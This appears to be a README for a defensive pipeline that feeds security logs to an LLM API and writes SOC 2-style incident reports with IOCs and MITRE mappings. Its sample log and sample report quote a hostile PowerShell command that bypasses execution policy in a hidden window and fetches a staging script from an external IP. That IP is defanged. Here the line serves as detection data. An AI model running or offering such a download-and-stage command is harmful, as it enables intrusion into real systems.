# Generative AI Incident Triage & Investigative Reporting

## Objective

This repository contains a Python-based automation pipeline designed to accelerate incident triage by integrating Large Language Model (LLM) APIs (OpenAI/Claude) into the security operations workflow. The pipeline ingests raw, unstructured security logs, normalizes the data, and uses generative AI to extract critical Indicators of Compromise (IOCs). It outputs structured, audit-ready investigative documentation that conforms to SOC 2 incident reporting standards, reducing manual documentation time and ensuring consistency across incident tickets.

### Engineering Capabilities Demonstrated

- **API Integration & Automation:** Engineering Python scripts to interact securely with generative AI endpoints (e.g., OpenAI API) using environment variables and token management.
- **Prompt Engineering for SecOps:** Designing strict, system-level prompts that instruct the LLM to parse technical telemetry without hallucinating facts, enforcing deterministic JSON or Markdown outputs.
- **Log Normalization:** Parsing diverse, multi-tenant log formats (Windows Event Logs, Suricata EVE JSON, Wazuh alerts) into a standardized context window for the AI model.
- **Automated Threat Extraction:** Using natural language processing to identify and categorize IP addresses, file hashes, and attack vectors from dense log data.
- **Compliance & Audit Readiness:** Generating standardized incident summaries that include executive overviews, technical timelines, and containment recommendations suitable for SOC 2 compliance audits.

### Tools & Core Technologies

| Layer | Component / Technology Used | Purpose |
| :--- | :--- | :--- |
| **Language** | Python 3.x | Core execution, file handling, and API routing |
| **AI Integration** | OpenAI API (GPT-4) / Anthropic API | Log analysis, IOC extraction, and natural language summarization |
| **Data Handling** | `json`, `re` (Regex) | Parsing raw security alerts and validating output structures |
| **Reporting** | Markdown / PDF Generation | Formatting the AI output into readable incident tickets |
| **Frameworks** | SOC 2 Incident Criteria | Baseline for report structure and mandatory fields |

---

## Phase 1: Data Ingestion and Normalization

To ensure the AI model processes data accurately, raw logs from heterogeneous sources are ingested and cleaned before being passed to the API.

### Parsing the Security Payload

The pipeline begins by reading exported JSON alerts. The script strips unnecessary metadata (such as internal indexing tags) to optimize the LLM context window and reduce API token consumption.

**Python Logic Snippet (`log_parser.py`):**

```python
import json

def load_and_clean_log(file_path):
    with open(file_path, 'r') as file:
        raw_log = json.load(file)

    # Extract only actionable security fields to save token space
    cleaned_log = {
        "timestamp": raw_log.get("timestamp"),
        "rule_description": raw_log.get("rule", {}).get("description"),
        "source_ip": raw_log.get("agent", {}).get("ip"),
        "full_log": raw_log.get("full_log")
    }
    return json.dumps(cleaned_log)
```

**Example Output:**

```json
{
  "timestamp": "2026-07-02T14:22:00Z",
  "rule_description": "PowerShell execution policy bypass detected",
  "source_ip": "192.168.1.45",
  "full_log": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri hxxp://103[.]15[.]22[.]88/stage1.ps1"
}
```

---

## Phase 2: Prompt Engineering & AI Execution

The core of the tool relies on strict prompt engineering. The LLM is instructed to act as a senior incident responder and is restricted from fabricating external information.

### Constructing the System Prompt

The script constructs a strict instruction set, forcing the AI to output a structured incident report.

**Python Logic Snippet (`ai_triage_engine.py`):**

```python
import os
import requests
import json

def generate_incident_report(cleaned_log):
    api_key = os.getenv("OPENAI_API_KEY")
    url = "https://api.openai.com/v1/chat/completions"

    system_prompt = """
    You are a Tier 3 SOC Analyst. Analyze the provided security log.
    Extract the following information and format it as a markdown report:
    1. Executive Summary (2-3 sentences max)
    2. Extracted IoCs (IPs, Hashes, Domains)
    3. MITRE ATT&CK Tactic/Technique mapping
    4. Recommended Containment Steps
    Do not hallucinate data. If a field is missing, state 'Not present in logs'.
    """

    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json"
    }

    payload = {
        "model": "gpt-4",
        "messages": [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": cleaned_log}
        ],
        "temperature": 0.2  # Low temperature for deterministic, factual output
    }

    response = requests.post(url, headers=headers, data=json.dumps(payload))
    return response.json()['choices'][0]['message']['content']
```

---

## Phase 3: Automated Investigative Reporting

Once the LLM returns the structured response, the pipeline writes the output to a standardized Markdown file, ready to be attached to a Jira ticket or internal case management system.

### Report Generation and Output

The pipeline finalizes the process by saving the AI-generated analysis into an audit-ready format.

**Example AI Output (`Incident_Report_INC001.md`):**

```markdown
### Executive Summary
At 2026-07-02T14:22:00Z, the SIEM detected a PowerShell execution policy bypass originating from endpoint DESKTOP-492. The process initiated an external network connection to a known malicious IP address, indicating a likely payload staging attempt.

### Extracted Indicators of Compromise (IoCs)
* **Source IP:** 192.168.1.45
* **Destination IP:** 103[.]15[.]22[.]88
* **Command Line:** `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest...`

### MITRE ATT&CK Mapping
* **Tactic:** Execution (TA0002)
* **Technique:** Command and Scripting Interpreter: PowerShell (T1059.001)

### Recommended Containment Steps
1. Execute immediate network isolation on DESKTOP-492 via EDR.
2. Block destination IP 103[.]15[.]22[.]88 at the perimeter firewall.
3. Initiate an anti-malware scan on the affected endpoint to locate dropped payloads.
```

---

## Deployment and Usage

1. **Environment Configuration:** Clone the repository and install dependencies (`pip install requests`).
2. **API Keys:** Provision an API key from OpenAI or Anthropic. Store the key securely as a local environment variable (`export OPENAI_API_KEY="your_key_here"`).
3. **Execution:** Run the main orchestrator script and pass a raw log file as an argument:

    ```bash
    python main_triage.py --log ./sample_alerts/wazuh_alert_1.json --output ./reports/
    ```

4. **Validation:** Review the generated `.md` file in the output directory to verify formatting and data accuracy.
